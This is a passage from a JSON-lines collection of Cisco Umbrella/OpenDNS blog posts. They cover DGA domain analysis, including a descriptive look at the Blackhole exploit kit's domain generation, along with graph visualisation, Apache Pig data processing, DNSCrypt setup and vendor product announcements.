random lowercase alphabetic string with a length between 6 and 12 characters. Below we can see the labels’ length distribution and the labels’ character frequency distribution of the entire dataset of 12000+ DGA domains. It seems from the dataset that all lengths of the labels are more or less equally likely. We also observe from the character frequency graph that all letters of the alphabet are used in generating the domains’ labels, and it is interesting to see how the frequency alternates between consecutive letters in the alphabet. In other words, if we index the alphabet letters into an array starting from index 0. Letters with even indices (0,2,4,6, etc) have all about the same frequency and letters with odd indices (1,3,4,5, etc) also have approximately the same frequency. This gives a few hints on how the DGA algorithm operates, suggesting patterns in how the set of domains is created. In addition, the time component comes into play since a new distinct set of DGA domains is generated every day. Resolving DGA domains All the 12000+ DGA domains are nxdomains except for 5 domains that resolve: comiss.com 107.20.206.69 10800 mcscwi.org 54.246.158.32 86400 oumaac.com 141.8.224.183 300 qqmiao.com 198.58.102.106 600 yousuo.com 65.19.157.194 86400 Let’s go over some OSINT gathered about these domains and IPs. comiss.com is a parked domain hosted on a parking IP 107.20.206.69. The IP is currently associated with dropping FakeAV [VirusTotal report] mcscwi.org was registered on Feb 12th, 2013, and seems to belong to the “Milwaukee Community Service Corps”. It resolves to a shared hosting IP 54.246.158.32. oumaac.com is also a parked domain that resolves to a parking IP 141.8.224.183. This IP is currently associated with dropping trojan worms [VirusTotal report] qqmiao.com resolves to a SoftLayer shared hosting IP 198.58.102.106. There is no known public record of malicious activity on this IP. yousuo.com is a parked domain that resolves to a parking IP 65.19.157.194. This IP has been associated with dropping trojans [VirusTotal report] Conclusion In conclusion, this is a rather odd DGA campaign that lasted for more than two weeks with 12 domains, rose to 12000+ domains within less than a week, then suddenly stopped. There is no confirmation yet of its maliciousness as we are not aware at the time of this writing of the actual sample generating these domains. All of these domains have been blocked as a preemptive protection measure for our customers, and we will keep a close eye on this phenomenon and report any new findings.", "date": "2013-10-24"},
{"website": "Cisco-Umbrella", "title": "Data in Movement: The Frenetic Dance of a State Machine", "author": ["Thibault Reuille"], "link": "https://umbrella.cisco.com/blog/data-movement-deeper-look-complex-state-machine", "abstract": "Over the past few decades, the tech world has been investing quite a bit of time and effort into the creation of robust distributed cloud systems, and the increasing need for resources and performance leads us to a decentralized agglomeration of data acting transparently like a whole. This new face of the internet as we know it  involves many actors: some focus on storage, some may focus on routing, some are in charge of keeping the information up-to-date and finally, the users of such a system are the key agents that constantly create fresh content. We are building organized structures that are beginning to function more and more like primitive digital brains designed to perform specific tasks. Visualization concept These shared knowledge databases have brought a new challenge: how do we monitor the current state of such a dynamic system? Indeed, it is not an easy task. Modern systems include billions of elements and in most cases users can add, delete, and modify items at any time. And because the data is decentralized, it can be pretty tricky to make sure we’re looking at an up-to-date version of the system. Last but not least, in many situations, we are interested in not only visualizing the current system, but also the evolution of that system over time. Depending on how the databases are built and how the various modifications are stored, this task can become extremely complex in terms of memory usage, processing time and data consistency. Furthermore, what about the visualization perspective? How do we choose a layout that works for our needs? That is, how do we design a visualization technique that will be able to represent a structure constantly evolving over time? Of course, we can’t answer those questions all at once; in this article we will focus on one part of the problem. We propose an idea that will help us form a visual representation of a general data flow inside a graph model. The basic idea is very simple indeed: each graph edge has an “Activity” attribute defined as a float value. Then we setup a particle system to make small textures fly from the first edge node to the second one. Finally we use the “Activity” value to set the speed of each edge particle. The result is an interactive representation of the activity of the whole system we want to monitor, giving us an easy way to spot the features of the global data flow. Depending on the system we are trying to monitor, this can be applied to many different problematics: Network traffic Chat communication inside a social network Users page transitions in a web site (Markov chain analysis) Average path in a tree / graph (Decision tree monitoring) And many others… Demo: A network activity simulation Today we present a real-time simulation in WebGL showing a global edge activity in a graph model. For demonstration purposes, the data set and activity are randomized to illustrate the proof of concept. Controls Hit play/pause to control the animation Navigate with the mouse and arrows (FPS view) Double-click on a node to zoom in and switch to a spherical view. Click on an empty area to go back to standard FPS view. Switch through the different layout modes in the menu. Drag and drop nodes with the mouse to play with the physics engine. A bigger dataset in action Of course, this article wouldn’t be complete without a concrete application on our Security Graph. Here is what the same process looks like on a related domain graph extracted from a given domain. To put it in a nutshell, when two domains are requested within a small time frame (1 second), we add a “related domain” link between them. This helps us understand which actors and services are at play when we access a given domain. For example, here are the “www.youtube.com” related domains (click to enlarge): You may also notice that we count each related domain appearance. We can then calculate a normalized probability which we use to set the edge activity. In other words, it is like visualizing the markov chain of the related domains. (These are gif animations. Click on them to open a new tab.) This is what it looks like on a graph containing 1,455 nodes and 2,187 edges. And the same result on a bigger graph: 11,779 nodes, 16,470 edges. Conclusion In conclusion, monitoring a dynamic system leads to many new challenges, and not only in terms of graph activity. It opens the door to several new approaches and brings a lot of fresh questions. We’ll take a closer look at questions like these in the weeks to come: How do we extract the global state of the graph activity? What patterns can we find to help us improve the graph state? And last but not least, how do we monitor and apply automatic retro-action on the system?", "date": "2013-10-16"},
{"website": "Cisco-Umbrella", "title": "Networks in Space: When data goes supernova", "author": ["Thibault Reuille"], "link": "https://umbrella.cisco.com/blog/data-goes-supernova", "abstract": "The universe is big, mysterious and full of secrets. Every day, servers exchange enormous amounts of data. Usually, this data is kept and archived for a defined period of time. As we store more and more information, our desire to understand its behavior grows. The reason is simple: knowledge is powerful. So, if we identify a pattern in our past, we master the present – then we can predict the future. Today’s data scientists are the modern oracles, always trying to discover ingenious ways to analyze information in order to identify new patterns and anomalies. Just like the first astronomers raised their eyes to the sky and clouds to predict the seasons, we are constantly analyzing a deluge of digital messages to monitor the general state of the system. It is crucial to step back and take a look at the big picture and understand that abstraction is the key to mastering the present. Visualize the universe When it comes to patterns, semantic graphs are one of the most beautiful data structures out there. They can represent anything and can be applied to a wide range of problems, from social networks to artificial brains. Graph nodes can define any type of information and edges can model arbitrary connections between them. Sure, it sounds simple in theory, but in practice we are dealing with billions and billions of nodes and edges! When it comes to visualization, there is a tremendous challenge in building an engine that can handle the vast amount of data that the universe holds. Even more importantly, the graph has to be dynamic and constantly changing over time. The goal is to build a robust and stable tool to establish, try, and confirm our hypotheses. How does it work? The engine recreates a physical force system where connected nodes attract each other and disconnected nodes repulse each other. At first, all the nodes are placed at approximately the same position, forming a point of high density. Of course, at this stage it’s still impossible to see anything clearly. But then, we heat the node particles at a high temperature and let the physics engine do the rest! Temperature creates a random particle movement and the messy network structure expands in space at high speed, throwing nodes in every direction. That’s right, an explosion of data! After this stage, the structure progressively reaches equilibrium. This is the true beauty of this method: we artificially reimplemented a natural force directed system and therefore natural structures emerge. We cool down the temperature progressively and as the particle acceleration decreases, the network structure crystallizes. Demonstration Since a picture is worth a thousand words, we’re sharing with you a WebGL application and a couple of screenshots of our visualization tool to illustrate this algorithm. You may note that the process has been intentionally slowed down to make the attraction-repulsion forces more obvious. Controls: Click play to start animation Navigate with the mouse and keyboard arrows Double click on a node to zoom in and target a node Click anywhere to go back to FPS view Select various display modes in the menu NOTE: The engine may take a while to load, please be patient. Umbrella Security Graph Data Sets Using this visualization method, we can process the massive amounts of data flowing into to the Umbrella Security Graph at any given time – watching for new malicious patterns or any other unusual activity. It’s always interesting to navigate around certain unknown domains, exploring their infected neighbors to determine the likelihood of the domains becoming compromised as well. Below, you will see actual data sets extracted from the Umbrella Security Graph database, representing relationships between domains. Domain neighborhood with a depth of 3 : Domain neighborhood with a depth of 4 : References : https://en.wikipedia.org/wiki/Force-directed_graph_drawing", "date": "2013-08-13"},
{"website": "Cisco-Umbrella", "title": "Introducing Internal Networks: map your entire distributed network with ease", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/introducing-internal-networks-map-your-entire-distributed-network-with-ease", "abstract": "One goal of the Umbrella security service is to allow you to secure each component of your increasingly distributed network in a way that makes the most sense for your organization.  Up until now, Umbrella Insights and Umbrella Everywhere customers could apply malware protection and acceptable use policies by satellite offices, roaming laptops, mobile devices, and headquarters via Active Directory users, computers & groups. But with our latest feature, Internal Network Identities, customers can now apply policy even to guest wireless, classrooms, computer labs, and server rooms. Check out the 3 minute video , or read on to see how it works. The way it works is simple: drop one of our lightweight virtual appliances into your network, direct your DNS traffic through it, and start mapping your network based on specific internal IP addresses and/or subnets. You can apply policy immediately, or evaluate how those resources are using the network through our reporting functionality and then choose to apply policies that best suit them. One of the great things about how the Umbrella cloud-delivered Web security solution works is that you can layer on policies from the outside-in, which ensures a standard policy is applied but exceptions can be made. For example, a customer could create a general, restrictive policy for all distributed offices, based only on redirecting their DNS traffic to the Umbrella service. Next, for that customer’s larger sites, they might drop a Virtual Appliance in and define specific policies for those sites. Then, that customer could create some policies for internal resources within those sites, like  guest wireless or testing labs. Finally, the customer could integrate with Active Directory to provide user-specific policies. The best part is that all of this is managed centrally through a single Web-based console and policy builder that’s easy to use for administrators of all skill levels. The net result is that you can define and manage your distributed network in the way that works best for you. Just another improvement to the Umbrella service to help provide you with the visibility and control you need to keep your users safe and productive!", "date": "2013-04-23"},
{"website": "Cisco-Umbrella", "title": "Why we love Apache Pig", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/pig-jruby", "abstract": "The Umbrella Security Labs research team is constantly processing terabytes of log files through dozens of Hadoop jobs in order to build the data we need for our predictive models. Some tools have proven to be invaluable time savers. The tool we use most often to write map/reduce jobs is Pig , a high-level language that makes it easy to describe common map/reduce workflows. The tool builds a standalone JAR file out of a script, that eventually runs as a  standard Hadoop job.. The language itself, naturally called Pig Latin, is a succession of simple statements taking an input and producing an output. Inputs and outputs are structured data composed of bags, maps, tuples and scalar data. A bag is a collection of tuples, and bags can be nested. This is one of the main things that make Pig very simple yet very powerful. Columnar data, as stored in HDFS, usually doesn’t support any kind of nested data, even though Parquet looks extremely promising in this regard. This set of (name, client IP, timestamp) rows can be stored like this on HDFS: www.example.com  172.16.4.2  1365116918 www.example.com  10.69.42.21 1365116342 www.example.com  10.69.42.21 1365135730 www.example.com  10.69.42.21 1365132469 www.example.com  192.168.9.6 1365003704 cuteoverload.com 192.111.0.1 1365176541 cuteoverload.com 192.111.0.1 1365200469 But Pig can map these records to arbitrary schemas that can be a way more natural view of the same data: {\n (\"www.example.com\",{ (\"172.16.4.2\",  {1365116918, 1365116342}), (\"10.69.42.21\", {1365171304, 1365135730, 1365132469}), (\"192.168.9.6\", {1365003704}) }), (\"cuteoverload.com\",{ (\"192.111.0.1\", {1365176541, 1365200469}) }) } A bag can be arbitrary large, and can itself contain arbitrary large bags. More importantly, a bag is spillable: its content doesn’t have to fit in memory. While Pig will do its best in order to keep the content of a bag in memory before processing it, it also includes a sophisticated memory manager that can transparently spill the content to disk if necessary. This is a very important feature for our M/R jobs, where some popular domain names like Google.com can be linked to huge amounts of data. Not having to worry about it fitting in memory, and possibly have to rewrite our jobs in a different way just for a handful edge cases is a massive time saver. Pig’s documentation and tutorials are excellent, so I will just walk through a couple typical operations to show how quickly these can be achieved. These are self-explanatory. Filtering d1_with_bad_sum = FILTER d1_with_bad_sum BY n > 1; Aggregation d1_with_bad_log_n_max = FOREACH (GROUP d1_with_bad_sum ALL) { GENERATE LOG(MAX(d1_with_bad_sum.n)) AS log_n_max; }; Joins jgs = FOREACH (JOIN d1_with_bad_sum BY name, d1_sum BY name) { GENERATE d1_with_bad_sum::name AS name, ((-100.0 * d1_with_bad_sum::p * LOG(d1_with_bad_sum::n)) / (d1_sum::p * d1_with_bad_log_n_max.log_n_max)) AS score; }; Sorting jgs = ORDER jgs BY score ASC, name ASC; Secondary sorting pairs_r = FOREACH (GROUP raw BY client_ip) { client_queries = FOREACH raw GENERATE ts, name; client_queries = ORDER client_queries BY ts, name; GENERATE client_queries; }; In this last example, the content of a bag is sorted by client IP address, and for each client IP address, the list or queries is sorted by timestamp. These statements are lazily evaluated, and transparently converted to sequences of mappers, reducers and combiners. When the Pig Latin language is not enough The simplicity of the Pig Latin language comes with some apparent limitations. Once Pig has been added to your toolbox, you will probably feel the need for some additional functions, may it be for loading and saving data in an unsupported format, or for applying a specific operation to a collection of data. Enter Pig User Defined Functions. Thanks to a very clean API, additional functions can easily be written in virtually any programming language implementation running on the JVM. Our language of choice for Pig UDFs is Ruby, or rather JRuby which is a fantastic implementation of the Ruby language for the JVM. Pig ships with first-class support for JRuby and the exposed API couldn’t be any simpler. As an example, let’s teach Pig a new trick: transforming Labeled Tab-separated Values into data bags of key/value pairs (maps). All we need is declare a new class that inherits PigUdf . All public methods from this class will be immediately visible to Pig, the only requirement being to define the output schema. require 'pigudf' class LTSV < PigUdf outputSchema \"map[]\" def parse(str) Hash[str.split(\"t\").map{|f| f.split(\":\", 2)}] end end Now, let’s use this new function from Pig: REGISTER 'ltsv.rb' USING jruby AS LTSV; raw    = LOAD 'access.log' USING PigStorage('n') AS raw:chararray; parsed = FOREACH x GENERATE LTSV.parse(raw) AS m; Et voila! JRuby lets us easily extend Pig with new functions that can operate on scalar data as well as ginormous data bags that Pig will automagically spill to disk to keep memory usage below a high watermark. Numerous third-party packages for Pig are freely available, our current favorites being LinkedIn’s DataFu and the GraphChi graph engine Things we wish we knew when we started using Pig Excited about Pig? Here are a few things that may not stand out when reading the documentation for the first time, but that turn out to be extremely useful. – The DESCRIBE and ILLUSTRATE commands are your best friends for debugging a script. The ILLUSTRATE command alone might be a good reason for chosing Pig over something else. – pig -x loads and stores files locally instead of a distributed map/reduce job. For small data sets, the job is very likely to start and run orders of magnitude faster. This comes in handy when developing a new script. – Besides a command-line tool, Pig is a Java package. Scripts can be executed from any language implementation running on the JVM. This is especially useful for iterative processes. – Nested FOREACH statements are very powerful. – Compress map output and temporary files: SET mapred.compress.map.output true; SET mapred.map.output.compression.codec org.apache.hadoop.io.compress.SnappyCodec; SET pig.tmpfilecompression true; SET pig.tmpfilecompression.codec lzo; – The content of the ~/.pigbootup file is read and executed at startup time. This is a good place to store default settings. – Talking about settings, these will make your eyes bleed a bit less: SET pig.pretty.print.schema true; SET verbose false; – Read the FAQ. Twice. Pay attention to the different JOIN strategies. Using the correct one can make a job run way faster. – New features introduced in recent versions are disabled by default for a reason. They can provide significant speedups, but also lead to obscure bugs that will eventually drive you crazy. You’ve been warned. – Real pigs can’t fly. Pig is only one of the numerous tools we use daily in order to slice and dice data. While we are still occasionally using Java and Rubydoop , the Pig+JRuby combo currently remains for us the most efficient way to quickly develop and test new algorithms, such as the ones we are using to discover thousands of suspicious domains every day.", "date": "2013-04-08"},
{"website": "Cisco-Umbrella", "title": "New data center live: Hong Kong", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/new-data-center-live-hong-kong", "abstract": "A few weeks ago we sent George, our fearless Director of Operations, off to Hong Kong with some very fragile cargo: servers and routers for our new data center. Today I’m happy to share the news that our Hong Kong data center is live and handling OpenDNS traffic. That means our users in China, India, Japan and other nearby countries will benefit from local redundancy from our other Singapore site and significantly improved performance and speed. And since we’ve been seeing skyrocketing growth in the region, it also means we’ll be able to handle extra capacity without concern. Like all of our data centers, Hong Kong is a part of our global anycast security network. Here’s a quick refresher course on how anycast routing technology works: Of our fourteen global data centers, anycast routing means we can promise you that no matter where you are, we’ll always be routing your requests to the server location topologically nearest you. It also means that should a server be taken offline for any reason, you’ll automatically be routed to the next closest location. And in case you missed it, we’re now serving 50 million users around the world and 40 billion DNS requests each day . You can expect to see us continue optimizing our current data centers to handle additional capacity and adding even more locations to our impressive global footprint in the coming months and years.", "date": "2012-09-05"},
{"website": "Cisco-Umbrella", "title": "“Blackhole” Exploit Kit DGA Analysis", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/blackhole-exploit-kit-dga-analysis", "abstract": "[ Editor’s note: Our new security research team is cranking out information faster than we can create a security blog.  So for now, we’re sharing some of the cool stuff they are doing here. Here’s one of their first pieces, dissecting the “Blackhole” exploit kit. ] What is the “Blackhole” Exploit Kit? A very popular and customizable kit to exploit a range of client vulnerabilities via the Web. Hackers license the kit (or rent an already exploited site) to cyber criminals. Cyber criminals compromise Web pages and embed an invisible iFrame. Potential victims visit a compromised Web page and are redirected to the hosted exploit. If the victim has one of the targeted client vulnerabilities, their device is infected. OpenDNS’s enforcement is device-, application-, protocol- and port-agnostic so all our users with OpenDNS malware protection are protected. Redirect to malware host site within invisible iframe. What is a (DGA) Domain Generation Algorithm? Multiple, frequently generated domains are used to host the exploit kit to prevent the security community from easily blocking the site or the site’s DNS record. This technique has been used since 2004 for botnet controllers, but appears by many in the security community, to now be an emerging trend for malware sites. This new “Blackhole” variation generates one unique second-level domain every 12 hours. The machine’s timestamp seeds a fixed cryptographic algorithm. The algorithm produces 16-character domain labels with a .ru top-level domain. Domain names using this algorithm are registered in advance of dates about 2 months from now. OpenDNS blocks all such domains for users of our service. Snapshot taken on July 6 shows domains generated in the past week and two future days. What did OpenDNS discover? Domain name analysis can detect strings in domain labels that have entropy or a lack of order that is a strong indicator that an algorithm was used to create the domain versus a human. Very random domain name strings have a high lexical complexity. These are often software generated with potential malicious origin. Blackhole DGA domain complexity is graphed in red below. Human-readable domain strings have a low lexical complexity. These are often legitimate sites. The top 1 million accessed domains’ complexity is graphed in green below. Lexical analysis on the domain names. These domain names were observed to have concentrated DNS queries with short life spans, and exhibited a temporal progression every 12 hours. We saw abnormally high levels of activity at the time of domain generation, which quickly faded to near zero within a day or two. The few DNS queries outside this time window may be due machines with an incorrect date set or security research activity. More than a half million connections were attempted to these malicious domains within one week (June 29-July 5, 2012). Trending query counts for six consecutive generated domains. Sampled a range of domain names generated for May 5 – Sept 23 at two times (July 5 & July 9). The authoritative name servers used to resolve the A records for the generated domains have changed twice. On July 5, three domains (https443.org, https443.net, compress.to) were hosted from a free dynamic DNS provider (https443.net via www.changeip.com). On July 9, one domain (otlard.kz) was hosted from a ccTLD (country-code top-level domain). The previously used name servers are no longer resolving A records for generated domains corresponding to dates before July 3rd. The new name servers are not resolving A records for generated domains today or into the future. We propose that the findings indicate that the operation is being brought online gradually for technical reasons or to avoid detection. There has been significant press coverage regarding this new DGA technique over the last week, which may have prompted the hackers to change the name servers which is more lax in their registration requirements (e.g. Kazakhstan) and suspend active use. Blackhole DGA DNS resolution changes from May 5 thru September 23. We also searched the public portion of the malware domain list (http://www.malwaredomainlist.com) using these ASNs and found that ASNs 16265 and 39743 were flagged multiple times for hosting malicious domains or IPs in the past. Malware domain list search results. OpenDNS found conclusive evidence that the domain names discovered were generated by software with malicious intent. All future domains using this DGA are included in our inbound malware protection for OpenDNS Enterprise Insights and Enterprise customers.", "date": "2012-07-07"},
{"website": "Cisco-Umbrella", "title": "Field Reports: Why a safety-focused company replaced Websense to improve network security", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/field-reports-why-a-safety-focused-company-replaced-websense-to-improve-network-security", "abstract": "Roka Bioscience is a company full of safety experts. The leading bioscience company is focused on improving food safety testing measures and helping companies safeguard their brands. This emphasis on safety is the foundation of the organization’s approach to Internet security as well. In today’s edition of field reports we take a look at why Roka Bioscience made the switch from a Websense appliance to OpenDNS Enterprise. The Roka Bioscience IT team was searching for a solution that would easily prevent employees from accessing sites known to host malware or botnets in addition to meeting the organization’s straightforward Web filtering needs. Prior to deploying OpenDNS Enterprise, Roka Bioscience was using a Websense appliance for Web filtering but the cumbersome appliance was too demanding for the small team to manage. We asked Daniel Churco, the information technology manager for Roka Bioscience why his team started searching for a solution to replace Websense. He explained, “We were previously using Websense but found the appliance-based system to be time-intensive. Internet security is a top priority for our company, so we needed a hands-off solution that could easily be managed by our smaller team.” In addition to the difficulty of managing the bulky Websense appliance, the small team also devoted significant resources to cleaning up malware infections. After evaluating alternative solutions from Websense and Barracuda Networks, the Roka Bioscience IT team selected OpenDNS Enterprise because they found it to be the ideal, low-touch solution for a small team that prioritizes Internet security but can’t spare resources for complex management. Since switching to OpenDNS Enterprise, Roka Bioscience’s IT team has also reported significantly improved security and reliability. Daniel told us that his team loves OpenDNS Enterprise because it just works! He explains: “OpenDNS Enterprise works at the DNS level and perfectly integrates with all of our systems. We no longer have to worry about performance or reliability issues.”", "date": "2012-04-11"},
{"website": "Cisco-Umbrella", "title": "Tales from the DNSCrypt: Linux Rising", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/tales-from-the-dnscrypt-linux-rising", "abstract": "Update: Get step-by-step instructions for setting up DNSCrypt on Linux here When we released the Mac-only preview of DNSCrypt, we knew it was a game changer. The revolutionary piece of lightweight software encrypts all DNS traffic between you and our servers. We also knew it was our responsibility to get this fundamental improvement to Internet security ready for the masses as quickly as possible. That’s why last week we announced that we’re searching for a rockstar win32 hacker to build a Windows release. But the blog post catalyzed a frenzy of responses from Linux users asking when a version would be available for them. The good news, is that the wait is over for Linux users. In fact, there was never a wait at all. We published the code for DNSCrypt on GitHub when we released the preview, so although there isn’t a user interface built just yet, Linux users can still experience the benefits of DNSCrypt in just a few steps. Here are simple step-by-step instructions for setting up DNSCrypt on your Linux machine: Download a package for your Linux distribution . i386 and amd64 packages in .deb (Debian, Mint, Ubuntu…), and .rpm (Openwall, CentOS, Fedora…) formats are supplied. Install the package using your package manager Open a terminal. Enter: sudo /usr/sbin/dnscrypt-proxy –daemonize Set your DNS settings to 127.0.0.1. Confirm you’re using OpenDNS. Now that you’re using DNSCrypt, you can spread the word to other Linux users. We’d love to see your blog posts, videos and social media posts so don’t forget to tag @CiscoUmbrella . If you want to help build a GUI to make this process even easier for Linux users, we’d be happy to work with you to get it right. If you’d like us to review your work, email us at dnscrypt at opendns dot com . Additional instructions and compilation instructions for other operating systems can be found here .", "date": "2012-02-16"},
{"website": "Cisco-Umbrella", "title": "Top 10 networking and security trends and challenges", "author": ["Lorraine Bellon"], "link": "https://umbrella.cisco.com/blog/top-10-networking-and-security-trends-and-challenges", "abstract": "You’ve heard it so many times that it probably sounds like a cliché at this point: the way we work has changed. But how, exactly, has it changed? Your employees need the same level of network performance and security they would get if they worked in a central office, but they don’t work in the office. They work from kitchen tables, in airport lounges, and on public transit. Your IT team is tasked with protecting those users and delivering the reliability and productivity they’ve come to expect from a traditional network, but with a wildly different network topology and expanded perimeter. And – they must do it with limited time and strained resources, while still leveraging your existing investments. Sounds easy, right? Spoiler alert – it’s not. Even before the unprecedented shift to remote working in the first half of 2020, several key trends emerged over the past decade that have reshaped working styles. These changes led to changes in the networking and security landscape needed to support workers. In this post, we’ve identified 10 key trends and challenges that have changed the game for networking and cybersecurity professionals. 1. Increased cloud adoption Over the past decade, public cloud usage has exploded in popularity. Every year, enterprises produce more data, and increasingly this data is being stored in software as a service (SaaS) applications in the public cloud. In 2019, Enterprise Strategy Group projected that 60 percent of organizations will use SaaS applications for greater than half of their business needs by 2021, and that number is only expected to increase. 1 It’s essential to have strong security in place to protect that data no matter where it resides. 2. More network traffic There’s been an explosion in the sheer amount of business data transferred over the corporate network – for example, just look at how much video content is created and shared today. Data-intensive applications require large amounts of network traffic, which creates demand for more bandwidth that strains existing network infrastructure and centralized security processes. 3. More remote and roaming workers The new normal includes thousands of employees working from home, either temporarily or indefinitely. These users need to be protected as well as their counterparts at main office locations, even if their network traffic is going directly to the Internet. Most companies have VPN policies in place for employees working from home, but 85% of companies believe their employees regularly violate those policies. 2 A roaming worker is any employee that works from a home office or from another non-office location (like a client site or hotel room) at least one day a week. Though some workers are full-time roaming users (like traveling consultants), many other employees take on a “roaming user” role whenever they travel for business or work in a public place like a café. Roaming users need secure access to corporate resources even though they are outside the traditional network boundary. 4. More branch offices When employees do work in an office, chances are good that they don’t all work in a single headquarters location. The days of all employees working together in one place are long gone for all except the smallest companies. As organizations expand into new markets, often by acquiring smaller companies and their office footprints, their number of branch offices grows too. 5. More network inefficiency Traditionally, an organization would backhaul network traffic from branch offices and remote workers to headquarters to apply security policies, often using MPLS links. But as more data and devices join the network, that model leads to efficiency problems. Traffic destined for the Internet gets funneled to a headend (such as a corporate headquarters or data center) that directs it through a set of security checks and then provides Internet access — which creates a bottleneck. 6. Higher networking costs Along with the increase in data and traffic, there’s been an increase in the cost of providing reliable network bandwidth to users. A traditional WAN connects users at branch or satellite locations and applications hosted on servers in a centralized data center. These connections are usually created with dedicated MPLS circuits. However, these dedicated circuits are costly to provision and maintain, and they don’t scale or adjust quickly as business needs change. To combat this problem, 79% of organizations are either investigating, or already using, broadband direct internet access (DIA) at branch locations instead of backhauling traffic over MPLS. 3 But DIA introduces new security challenges. 7. Performance issues with SaaS apps Many businesses today use SaaS apps to conduct critical business functions, like sales operations, human resources, and general administrative work. But if those SaaS apps are set up to backhaul traffic using existing network links or VPN tunnels, users can experience latency, lost productivity, and frustration. When users experience performance issues with corporate-approved apps, they often turn to unauthorized and potentially risky apps to get their jobs done. More than 1,200 cloud services are used in the average large enterprise today, and as many as 98 percent of them are not approved by IT. 4 8. Security talent shortage 3.5 million cybersecurity jobs worldwide will not be filled by 2021. 5 With unemployment on the rise, what’s the reason for this shortage? Qualified security professionals are difficult to find, expensive to hire, and tough to retain. Even when you do find a security rock star, your teams require significant investments in costly training to stay ahead of the latest security threats and networking challenges. The skills shortage leads to security blind spots, which can have a huge impact on organizations. 9. Too many security tools Knowledge is power, but sometimes too much information is just that – too much! Remember those security professionals you just hired? They’re tasked with analyzing data from many different standalone security products that don’t integrate with each other. These different products all require different knowledge levels and skill sets to operate and maintain, and each one takes time. A recent Cisco CISO benchmark study indicates that most organizations find it challenging to orchestrate alerts from different tools, which affects their ability to monitor and correlate information quickly enough to respond to threats before they cause serious damage. 6 10. New cyberthreats taking advantage of security gaps Advanced cyberthreats like ransomware and remote access trojans (RATs) take advantage of a lack of visibility and control in a distributed network. Remote and roaming users are particularly susceptible because the traditional centralized security model doesn’t protect them effectively. That’s why 68% of organizations experienced attacks in which a branch location or roaming user was the source of compromise. 7 Putting it all together Your organization needs to consider innovative new networking and security options to address today’s challenges successfully. It might feel overwhelming, but we’re here to help you get started on the journey. Read our ebook Secure Access Service Edge (SASE) for Dummies to learn how cloud-delivered networking and security can transform your organization for the better. In just five short chapters, you’ll be well on your way to a better experience for your users and less stress for your IT team. 1 Enterprise Strategy Group, The Rise of Direct Internet Access , 2019 2 Enterprise Strategy Group, The Rise of Direct Internet Access , 2019 3 Enterprise Strategy Group, The Rise of Direct Internet Access , 2019 4 Enterprise Strategy Group, The Rise of Direct Internet Access , 2019 5 Cybersecurity Ventures, Annual Cybersecurity Jobs Report , 2019 6 Cisco, Securing What’s Now and Next: 20 Cybersecurity Trends for 2020 , 2020 7 Enterprise Strategy Group, The Rise of Direct Internet Access , 2019", "date": "2020-07-23"},
{"website": "Cisco-Umbrella", "title": "Adult Site Blocking has a new category: proxies", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/adult-site-blocking-proxies", "abstract": "Does this sound familiar? You labor, with the best of intentions, to keep everyone on your network safe and their comings and goings secure, only to be met with successful attempts to bypass your efforts? Well, we have a new feature for you today, and it might make some 14-year old kids cry a little. We now let you block Web-based proxy sites. We added a new category to our Adult Site Blocking functionality called “Proxy/anonymizer.” This category, like the other adult site categories, is provided by our friends at St. Bernard. Here’s how we describe the new category: Proxy/anonymizer Sites providing proxy bypass information or services. Also, sites that allow the user to surf the net anonymously, including sites that allow the user to send anonymous emails. If you are blocking most adult sites, you probably want to block Web-based proxies too. Like Adult Site Blocking, this is free, too. As usual, this was added in response to your awesome and helpful feedback. Thanks for using OpenDNS. 🙂", "date": "2007-08-20"},
{"website": "Cisco-Umbrella", "title": "How to improve cybersecurity in healthcare", "author": ["Ken Howard"], "link": "https://umbrella.cisco.com/blog/how-to-improve-cybersecurity-in-healthcare", "abstract": "Healthcare is perpetually in a race – to save lives, to do things faster and better, to save money, and to protect patient data. Technology is a powerful accelerant that can help healthcare professionals get a jump start on the day. However, it can also open the door to cybercriminals looking to make some easy money. Because of the proliferation of internet-connected medical devices (the Internet of Medical Things) and because of the allure of holding sensitive patient information for ransom, the healthcare industry is particularly vulnerable to ransomware attacks. Hospitals and electronic health record (EHR) vendors in particular are hot targets for ransomware attacks. Why? Patient records are the most expensive type of personal information traded on the dark web; since 2016, 172 ransomware incidents have cost the U.S. healthcare industry more than $157 million. 1 As with healthcare itself, the best medicine is prevention. The most effective anti-ransomware strategy will detect and stop threats before they breach the perimeter. And with 90% of malware using DNS to gain command and control, exfiltrate data, or redirect web traffic, DNS-layer security is the most effective first line of defense against ransomware. 2 Cisco Umbrella provides this first line of defense because it is built into the foundation of the internet and blocks requests to malicious destinations before a connection is even established. Umbrella also provides protection for all devices on your network, regardless of location. As a cloud-delivered service, Cisco Umbrella is easy to deploy. It also uses intelligence to detect attacks before they launch. Finally, Umbrella can extend existing security investments using open APIs to programmatically extend protection for devices and locations beyond your perimeter. Cisco Umbrella provides visibility and context to: Gain visibility into all internet activity, including security activity, across all locations and devices Identify devices infected or users targeted by advanced attacks to reduce the time to remediation Identify potentially unauthorized access or threats to PHI data stored in cloud apps. Get up-to-the-minute threat information, as well as historical content about every domain on the internet See the relationships among malware, domains, IPs, and networks so you can quickly respond to critical incidents using Cisco Umbrella Investigate After setting up the first line of defense, it’s a good idea to monitor for lateral movement of ransomware within your network, eliminate its propagation, and reduce the amount of time any attack has to operate within your network. Learn more about the capabilities of Cisco Umbrella for your healthcare organization here . 1 https://www.comparitech.com/blog/information-security/ransomware-attacks-hospitals-data/ 2 https://blog.talosintelligence.com/2017/03/dnsmessenger.html", "date": "2020-07-21"},
